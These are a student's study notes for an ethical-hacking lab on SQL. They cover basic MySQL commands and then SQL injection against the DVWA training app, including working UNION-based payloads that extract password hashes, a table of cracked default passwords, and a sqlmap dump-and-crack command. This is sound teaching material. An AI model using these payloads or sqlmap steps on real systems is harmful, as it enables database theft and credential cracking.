# Lab 14: Understanding SQL Commands & Injections
> NDG Ethical Hacking v2 | Study Notes

---

## 📌 Overview

SQL (Structured Query Language) is used by databases to query, insert, update, and delete data.  
This lab covers basic SQL usage and how those same skills can be weaponized through **SQL Injection attacks**.

---

## 🗄️ Section 1: Basic SQL Commands

### Environment Setup
```bash
# Start MySQL service
service mysql start

# Login to MySQL as root (no password required)
mysql -u root
```

### Key Concepts
- `mysql -u root` → Connect to MySQL as the **root** user (`-u` = user flag)
- Once connected, the prompt changes to `MariaDB [(none)]>`
- Every SQL command must end with a **semicolon** `;`
- If you get stuck in `->` mode, type `\c` and press Enter to cancel

---

### Database Operations
```sql
-- View all existing databases
SHOW DATABASES;

-- Create a new database
CREATE DATABASE test;

-- Select/use a database
USE test;

-- Delete an entire database
DROP DATABASE test;
```

**Default system databases (do NOT touch):**
| Database | Purpose |
|----------|---------|
| `information_schema` | MySQL metadata (table/column info) |
| `mysql` | System settings, user accounts, privileges |
| `performance_schema` | Performance monitoring data |

---

### Table Operations
```sql
-- View all tables in current database
SHOW TABLES;

-- Create a table with columns
CREATE TABLE users (
    name VARCHAR(30),       -- Variable-length string, max 30 chars
    account INTEGER,        -- Whole number
    balance DECIMAL(10,2)   -- Decimal number (e.g., 10.00)
);

CREATE TABLE personal (
    name VARCHAR(30),
    address VARCHAR(30),
    city VARCHAR(20),
    telephone BIGINT        -- Very large integer (needed for phone numbers > 2.1 billion)
);

-- Delete an entire table
DROP TABLE personal;
```

**Data Types Explained:**
| Type | Description | Range |
|------|-------------|-------|
| `VARCHAR(n)` | Variable-length string, stores only actual length | up to n chars |
| `CHAR(n)` | Fixed-length string, always stores n chars | exactly n chars |
| `INTEGER` | Whole number | up to ~2.1 billion |
| `BIGINT` | Very large whole number | up to ~9.2 quintillion |
| `DECIMAL(x,y)` | Decimal number with x total digits, y after decimal | varies |

---

### Data Insertion & Retrieval
```sql
-- Insert data into a table
INSERT INTO users VALUES ('John', 123, 10.00);
INSERT INTO users VALUES ('Joe', 456, 20.00);

INSERT INTO personal VALUES ('John', '1313 Mockingbird Lane', 'Mockingbird Heights', 3105552368);
INSERT INTO personal VALUES ('Joe', '1313 Cemetery Lane', 'Greenbrier', 1313131313);

-- View all data in a table
SELECT * FROM users;

-- View specific columns only
SELECT name, balance FROM users;
SELECT name, telephone FROM personal;
```

---

## 🔍 Section 2: Querying with SQL

### Selecting Specific Columns
```sql
-- Instead of SELECT * (all columns), pick only what you need
SELECT name, balance FROM users;
SELECT name, telephone FROM personal;
```

### JOIN — Combining Two Tables
```sql
-- Retrieve data across both tables where names match
SELECT users.name, users.balance, personal.telephone
FROM users
JOIN personal
WHERE users.name = personal.name;
```

**How JOIN works:**
- Like merging two spreadsheets by a common column
- `users.name = personal.name` → only match rows where the name is the same
- Result: one combined table showing balance + telephone for each person

---

## 🗑️ Section 3: Deleting with SQL

```sql
-- Delete a specific row (WHERE clause is critical!)
DELETE FROM personal WHERE name='Joe';

-- Delete an entire table (structure + data)
DROP TABLE personal;

-- Delete an entire database
DROP DATABASE test;
```

**Deletion Hierarchy (from smallest to largest scope):**
```
DELETE (specific row)
  └── DROP TABLE (entire table)
        └── DROP DATABASE (entire database)
```

> ⚠️ **Warning:** `DROP` operations are **irreversible**. Always double-check before running.

---

## 💉 Section 4: SQL Injection

### What is SQL Injection?
SQL Injection is a web attack technique where an attacker **inserts malicious SQL code** into an input field, tricking the database into executing unintended commands.

**Target:** DVWA (Damn Vulnerable Web Application) — a deliberately insecure web app used for security training.

---

### How It Works

A normal login query looks like this:
```sql
SELECT first_name, surname FROM users WHERE user_id = '[INPUT]'
```

The web app **wraps your input in quotes automatically**.  
By inserting a `'` (single quote), you can **break out of the string** and inject your own SQL.

---

### Attack Payloads Used

#### Test 1 — Basic true statement
```
Input: 1=1
```
```sql
-- Resulting query:
SELECT first_name, surname FROM users WHERE user_id = 1=1
```
Returns the admin user → confirms the field is injectable.

---

#### Test 2 — Dump all users
```
Input: 1' or '0'='0
```
```sql
-- Resulting query:
SELECT first_name, surname FROM users WHERE user_id = '1' or '0'='0'
```
- `'0'='0'` is **always TRUE**
- Returns **all users** in the database

---

#### Test 3 — Extract database name and current user
```
Input: 1' or 1=1 union select database(), user()#
```
```sql
-- Resulting query:
SELECT first_name, surname FROM users WHERE user_id = '1' 
or 1=1 
UNION SELECT database(), user()#'
```
**Key concepts:**
- `'` after `1` → closes the auto-added opening quote
- `UNION` → links two SELECT statements together (like JOIN but for SELECT)
- `database()` → returns DB name (`dvwa`)
- `user()` → returns current DB user (`dvwa@localhost`)
- `#` → comments out the rest of the query (neutralizes the auto-added closing `'`)

Result: Database = `dvwa`, User = `dvwa@localhost`

---

#### Test 4 — Get database version
```
Input: 1' or 1=1 union select null,version()#
```
- `null` used as a placeholder (UNION requires same number of columns)
- `version()` → returns MySQL version

Result: `5.1.41-3ubuntu12.6`

---

#### Test 5 — List all tables
```
Input: 1' or 1=1 union select null, table_name from information_schema.tables#
```
- `information_schema.tables` → system table that stores **all table names**
- Dumped every table in the database
- Found: `users`, `guestbook`

---

#### Test 6 — Extract usernames and password hashes
```
Input: 1' or 1=1 union select user, password from users#
```
Result — Password hashes extracted:
| Username | Hash | Cracked Password |
|----------|------|-----------------|
| admin | 21232f297a57a5a743894a0e4a801fc3 | admin |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| user | ee11cbb19052e40b07aac0ca060c23ee | user |

> These are **MD5 hashes** — a one-way encryption. Can be cracked via dictionary/rainbow table attacks.

---

### Why the `'` and `#` Matter

```
Web app auto-generates:  SELECT ... WHERE user_id = '[YOUR INPUT]'
                                                      ^           ^
                                               auto quote       auto quote
```

- **Opening `'`** after your value → you close the string early, escaping the SQL context
- **`#`** at the end → comments out the trailing auto-quote, preventing syntax errors

Without `#`:
```sql
SELECT ... WHERE user_id = '1' or 1=1 union select ...'  ← syntax error!
```
With `#`:
```sql
SELECT ... WHERE user_id = '1' or 1=1 union select ...#'  ← trailing quote ignored ✅
```

---

## 🤖 Section 5: Using SQLmap

### What is SQLmap?
SQLmap is an **open-source automated SQL injection tool** that:
- Detects injectable parameters automatically
- Dumps entire databases
- Cracks password hashes via dictionary attacks

### Why We Need the Cookie
The target page (DVWA) requires authentication.  
SQLmap needs your **session cookie** to prove it's a logged-in user.

Cookie format:
```
security=low; PHPSESSID=<your_session_id>;
```

### SQLmap Command Used
```bash
sqlmap -u "http://192.168.68.12/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
       --cookie="security=low; PHPSESSID=<your_cookie_here>;" \
       --dump
```

**Flags explained:**
| Flag | Purpose |
|------|---------|
| `-u` | Target URL to attack |
| `--cookie` | Session cookie for authentication |
| `--dump` | Dump all data from the database |

> ⚠️ In terminal: paste with **CTRL+SHIFT+V** (not CTRL+V)

### SQLmap Process & Prompts
| Prompt | Answer | Reason |
|--------|--------|--------|
| Skip payloads for other DBMSes? | `Y` | We know it's MySQL |
| Include all MySQL tests? | `Y` | More thorough testing |
| Keep testing other parameters? | `N` | Only one injectable field |
| Store hashes to temp file? | `Y` | Save for later use |
| Crack via dictionary attack? | `Y` | Attempt to recover plaintext passwords |
| Which dictionary? | `Enter` | Use default wordlist |
| Use common password suffixes? | `Enter` | Skip (slow) |

### SQLmap Results
SQLmap automatically:
1. Identified the backend DBMS as **MySQL**
2. Found injectable parameter: `id`
3. Dumped the `dvwa` database
4. Extracted `users` and `guestbook` tables
5. Cracked MD5 password hashes using dictionary attack
6. Saved all output to `/root/.sqlmap/output/192.168.68.12/`

---

## 🛡️ Defense — How to Prevent SQL Injection

| Defense | Description |
|---------|-------------|
| **Parameterized Queries** | Never concatenate user input directly into SQL |
| **Input Validation** | Reject special characters like `'`, `"`, `#`, `--` |
| **Least Privilege** | DB accounts should only have minimum required permissions |
| **WAF (Web Application Firewall)** | Detect and block injection attempts |
| **Strong Password Hashing** | Use bcrypt/argon2 instead of MD5 |

---

## 📝 Quick Reference — SQL Commands

```sql
-- Database
SHOW DATABASES;
CREATE DATABASE name;
USE name;
DROP DATABASE name;

-- Tables
SHOW TABLES;
CREATE TABLE name (col1 TYPE, col2 TYPE, ...);
DROP TABLE name;

-- Data
INSERT INTO table VALUES (val1, val2, ...);
SELECT * FROM table;
SELECT col1, col2 FROM table;
SELECT * FROM table WHERE condition;
DELETE FROM table WHERE condition;

-- Advanced
SELECT a.col, b.col FROM a JOIN b WHERE a.key = b.key;
SELECT col1, col2 UNION SELECT col3, col4;
```

---

*Lab completed as part of NDG Ethical Hacking v2 — Lab 14*  
*Tools used: MySQL/MariaDB, DVWA, SQLmap, Kali Linux*
